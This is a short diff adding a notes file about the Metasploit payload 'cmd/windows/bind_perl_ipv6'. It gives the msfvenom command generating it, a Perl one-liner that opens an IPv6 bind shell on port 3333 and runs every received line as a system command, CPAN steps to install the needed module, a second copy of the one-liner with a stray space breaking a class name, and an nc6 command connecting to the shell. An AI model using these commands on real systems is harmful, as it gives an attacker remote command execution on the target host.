@@ -1,0 +1,35 @@
+cmd/windows/bind_perl_ipv6
+
+
+
+msfvenom.bat -p cmd/windows/bind_perl_ipv6 LPORT=3333
+
+perl -MIO -e "while($c=new IO::Socket::INET6(LocalPort,3333,Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}"
+
+perl -MCPAN -e shell
+cpan>install IO::Socket::INET6
+
+perl -MIO -e "require IO::Socket::INET6;while($c=new IO::Socket::INE T6(LocalPort,3333,Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r); system$_ while<>}"
+
+nc6.exe fe80::ac87:67a4:dd80:9d0 3333
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
